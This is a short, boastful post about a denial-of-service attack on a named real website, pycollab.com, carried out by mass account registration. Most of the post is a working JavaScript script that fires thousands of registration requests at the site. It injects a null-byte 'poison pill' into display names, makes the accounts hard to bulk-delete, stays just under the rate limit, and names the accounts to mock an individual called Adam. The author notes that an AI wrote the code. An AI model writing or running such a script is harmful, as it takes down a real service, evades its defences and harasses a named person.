# Account DoS

so since registering inside is just username displayname and password
i decided to send 9000 of those requests

and it was a DoS yay

heres the code cuz why not

```
(async function registerAdamArmy(y) {
    const url = "https://pycollab.com/auth/register";
    console.log(`Deploying ${y} Adam clones...`);

    for (let i = 1; i <= y; i++) {
        // Random suffix to make bulk-deletion harder for him
        const randomSuffix = Math.random().toString(36).substring(7);
        const username = `adam_is_noob_${i}_${randomSuffix}`;
        const display_name = `Adam %00 ${randomSuffix}`; // Poison pill included

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*"
            },
            body: JSON.stringify({
                username: username,
                password: "adam", // Setting the password to his name
                display_name: display_name
            })
        })
        .then(res => {
            if (res.status === 201 || res.status === 200) {
                console.log(`[+] Created: ${username}`);
            } else {
                console.log(`[-] Failed ${username}: ${res.status}`);
            }
        })
        .catch(() => {});

        // Throttle slightly to stay under the 500 RPS limit and avoid browser crash
        if (i % 25 === 0) {
            await new Promise(resolve => setTimeout(resolve, 200));
        }
    }
    console.log("Adam Army deployment finished.");
})(5000); 
```

yes the dos code was made by ai, but so was the whole site
